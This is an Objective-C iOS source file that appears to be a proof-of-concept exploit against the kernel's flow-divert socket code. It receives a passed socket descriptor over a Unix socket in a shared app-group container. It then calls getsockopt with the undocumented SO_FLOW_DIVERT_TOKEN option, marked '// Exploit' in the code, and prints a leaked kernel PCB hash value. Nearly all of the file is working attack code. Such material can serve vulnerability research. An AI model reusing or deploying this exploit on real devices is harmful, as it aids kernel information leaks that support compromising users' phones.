//
//  main.m
//  test
//
//  Created by 风沐云烟 on 2023/12/26.
//

#import <UIKit/UIKit.h>
#import "AppDelegate.h"

#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <string.h>
#include <fcntl.h>
const char *SOCKET_PATH = NULL;

int recv_fd(int socket) {
    struct iovec iov[1];
    char dummy;
    char cmsg_buf[CMSG_SPACE(sizeof(int))];

    struct msghdr msg;
    memset(&msg, 0, sizeof(struct msghdr));

    // 设置接收缓冲区
    iov[0].iov_base = &dummy;
    iov[0].iov_len  = 1;
    msg.msg_iov     = iov;
    msg.msg_iovlen  = 1;

    // 设置辅助数据
    msg.msg_control = cmsg_buf;
    msg.msg_controllen = sizeof(cmsg_buf);

    // 接收消息
    if (recvmsg(socket, &msg, 0) == -1) {
        perror("recvmsg");
        exit(EXIT_FAILURE);
    }

    struct cmsghdr *cmsg;
    int fd = -1;

    // 遍历辅助数据寻找文件描述符
    for (cmsg = CMSG_FIRSTHDR(&msg); cmsg != NULL; cmsg = CMSG_NXTHDR(&msg, cmsg)) {
        if (cmsg->cmsg_level == SOL_SOCKET && cmsg->cmsg_type == SCM_RIGHTS) {
            fd = *(int *)CMSG_DATA(cmsg);
            break;
        }
    }

    return fd;
}

#define SO_FLOW_DIVERT_TOKEN 0x1106

void UPDATE_lastpid(void) {
    int sockfd, received_sockfd;
    struct sockaddr_un addr;
    
    // 创建 Unix 域套接字
    sockfd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (sockfd == -1) {
        perror("socket");
        exit(EXIT_FAILURE);
    }
    
    // 设置套接字地址
    memset(&addr, 0, sizeof(struct sockaddr_un));
    addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, SOCKET_PATH, sizeof(addr.sun_path) - 1);
    
    // 连接到进程 A 创建的套接字
    if (connect(sockfd, (struct sockaddr *)&addr, sizeof(struct sockaddr_un)) == -1) {
        perror("connect");
        exit(EXIT_FAILURE);
    }
    
    // Receive socket document descriptor
    received_sockfd = recv_fd(sockfd);
    listen(received_sockfd,5);
    char to_BUF[0x40] = {0};
    socklen_t Length = 0x40;
    // Exploit
    getsockopt(received_sockfd, SOL_SOCKET, SO_FLOW_DIVERT_TOKEN, to_BUF, &Length);
    uint32_t pcb_hash = *(uint32_t*)(to_BUF + 14);
    printf("PCB_HASH_VAL:\t\t%#x\n",pcb_hash);
    
    listen(received_sockfd,5);
    sleep(5);
    close(received_sockfd);
    close(sockfd);
}


int main(int argc, char * argv[]) {
    NSString * appDelegateClassName;
    @autoreleasepool {
        // Setup code that might create autoreleased objects goes here.
        appDelegateClassName = NSStringFromClass([AppDelegate class]);
    }
    NSString *sharedFilePath = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:@"group.fmyy"].path;
    sharedFilePath = [sharedFilePath stringByAppendingPathComponent:@"SharedSocket.txt"];
    SOCKET_PATH = [sharedFilePath UTF8String];
    
    UPDATE_lastpid();
    return 0;
    //return UIApplicationMain(argc, argv, nil, appDelegateClassName);
}
